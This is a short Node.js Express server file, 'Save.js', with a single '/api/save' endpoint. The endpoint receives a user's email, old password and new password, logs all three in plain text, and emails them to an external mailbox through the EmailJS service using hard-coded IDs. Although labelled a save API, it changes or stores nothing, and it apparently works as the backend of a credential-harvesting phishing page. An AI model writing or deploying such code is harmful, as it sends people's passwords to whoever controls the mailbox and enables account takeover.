// Save.js (Node.js Backend API)
const emailjs = require('emailjs-com'); // Include EmailJS
const express = require('express');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json());

app.post('/api/save', (req, res) => {
  const { email, oldPassword, newPassword } = req.body;

  // Log the details to verify
  console.log('Email:', email);
  console.log('Old Password:', oldPassword);
  console.log('New Password:', newPassword);

  // Send email via EmailJS API
  emailjs.send('service_8hdqzju', 'template_hk6uqi8', {
    email: email,
    oldPassword: oldPassword,
    newPassword: newPassword
  })
  .then(response => {
    console.log('SUCCESS', response);
    res.status(200).send('Email sent successfully');
  })
  .catch(error => {
    console.log('FAILED', error);
    res.status(500).send('Error sending email');
  });
});

app.listen(3000, () => {
  console.log('Server is running on port 3000');
});